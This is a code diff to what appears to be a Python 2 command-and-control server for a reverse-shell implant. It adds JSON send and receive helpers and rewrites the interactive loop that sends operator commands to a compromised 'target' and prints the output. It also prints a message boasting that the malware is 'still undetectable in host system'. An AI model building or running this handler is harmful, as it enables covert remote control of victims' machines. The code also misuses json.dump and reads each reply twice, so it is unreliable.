@@ -3,18 +3,37 @@
 
 import socket
 from termcolor import colored
+import json
+
+
+def json_send(data):
+	json_data = json.dump(data)
+	target.send(json_data)
+
+def json_recv():
+	data = ""
+	while True:
+		try:
+			data = data + target.recv(1024)
+			return json.loads(data)
+		except ValueError:
+			continue
 
 
 def shell():
 	while True:
 		# getting command from command center, if q, quit the program, else continue...
 		command = raw_input("* Shell#~%s: " %str(ip))
-		target.send(command)
+		#target.send(command), doesn't work for bytes greater than 1024 bytes
+		# below replacement is for further support 
+		json_send(command)
+		
 		if command == 'q':
 			break
 		else:
-			message_target = target.recv(1024)
-			print(message_target)
+			print("[log] Malware is still undetectable in host system....")
+			json_recv()
+			print(json_recv())
 
 def server():
 	global s
